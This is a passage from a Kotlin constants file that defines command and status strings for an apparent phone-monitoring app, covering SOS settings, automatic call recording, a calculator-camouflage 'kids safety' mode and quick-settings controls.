    const val SOS_CONFIG_STATUS = "SOS_CONFIG_STATUS"

    // 12. Automatic Phone Call Recording
    const val CALL_RECORDING_CONFIG_COMMAND = "CALL_RECORDING_CONFIG_COMMAND"
    const val CALL_RECORDING_STATUS = "CALL_RECORDING_STATUS"
    const val CALL_RECORDING_SAVED = "CALL_RECORDING_SAVED"

    // Kids Safety & Calculator Camouflage
    const val CAMOUFLAGE_CONFIG_COMMAND = "CAMOUFLAGE_CONFIG_COMMAND"
    const val CAMOUFLAGE_STATUS = "CAMOUFLAGE_STATUS"

    // Hardware Button Controls & Quick Settings
    const val QUICK_SETTING_COMMAND = "QUICK_SETTING_COMMAND"
    const val QUICK_SETTING_STATUS = "QUICK_SETTING_STATUS"
}